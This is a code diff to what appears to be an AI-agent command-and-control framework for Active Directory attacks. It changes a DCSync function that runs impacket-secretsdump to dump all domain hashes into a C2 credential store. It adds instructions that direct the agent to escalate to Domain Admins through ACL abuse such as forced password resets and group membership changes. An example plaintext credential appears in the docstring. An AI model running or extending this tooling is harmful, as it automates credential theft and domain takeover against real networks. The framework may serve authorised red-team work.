@@ -623,13 +623,19 @@ def c2_generate_map(agent_id: str, output_path: str = "network_map.html") -> str
 def c2_dcsync(target: str) -> str:
     """
     Run impacket-secretsdump server-side to dump all hashes from a target.
-    target format: domain/username:password@ip
-    Example: 'ICCN.local/svc_backup:Password@2026!@10.0.2.8'
+    target format: domain/username:password@ip  — no shell quoting, pass the raw string.
+    Example: ICCN.local/svc_backup:Password@2026!@10.0.2.8
     NTLM hashes are automatically stored in the C2 credentials DB.
     Call this whenever you have confirmed admin credentials for any remote host.
     Blocks up to 2 minutes.
     """
-    import subprocess as _sp, re as _re
+    import subprocess as _sp, re as _re, shlex as _shlex
+    # Strip shell quoting the AI may include (e.g. 'creds'@ip) — subprocess
+    # doesn't use a shell so quotes are passed literally and break parsing.
+    try:
+        target = "".join(_shlex.split(target.strip()))
+    except ValueError:
+        target = target.strip()
     print(f"  [dcsync] impacket-secretsdump {target}")
     try:
         result = _sp.run(
@@ -735,6 +741,15 @@ Execute BOTH paths A and B whenever matches are found:
        - Use c2_aclabuse() for each ACL operation
        - After ForceChangePassword: the new password is the one you set — use it next
        - After AddMember to Domain Admins: the chain is complete
+
+  ACL EDGE PRIORITY RULES (follow strictly, do not deviate):
+    • GenericAll / ForceChangePassword on a USER → ALWAYS use forcechangepassword.
+      Never use genericwrite or any other technique when the target is a user and you
+      have GenericAll or ForceChangePassword. GenericWrite is only for non-password
+      attributes (e.g. ServicePrincipalName) and must NOT be used to reset passwords.
+    • GenericAll / AddMember on a GROUP → use addmember.
+    • GenericWrite on a USER (no GenericAll) → use genericwrite only if forcechangepassword is not available.
+
     Example path: "jsmith --[ForceChangePassword]--> svc_backup --[AddMember]--> Domain Admins"
     And you have jsmith credentials:
       Step 1: c2_ask_human("Ready to ForceChangePassword on svc_backup using jsmith. Proceed?")
